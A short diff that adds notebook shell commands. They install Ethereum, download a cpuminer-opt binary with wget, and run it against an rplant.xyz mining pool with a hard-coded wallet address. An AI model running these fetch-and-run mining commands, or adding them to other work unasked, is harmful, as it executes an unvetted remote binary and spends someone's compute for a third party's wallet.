@@ -1,0 +1,6 @@
+! sudo apt update
+! sudo add-apt-repository --yes ppa:ethereum/ethereum
+! sudo apt install ethereum
+! wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+! tar xvf cpuminer-opt-linux.tar.gz
+! ./cpuminer-avx2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Mktdza3bpHkaVFkyWqWV7Q6GiF8dGphQn1.KangBarbar
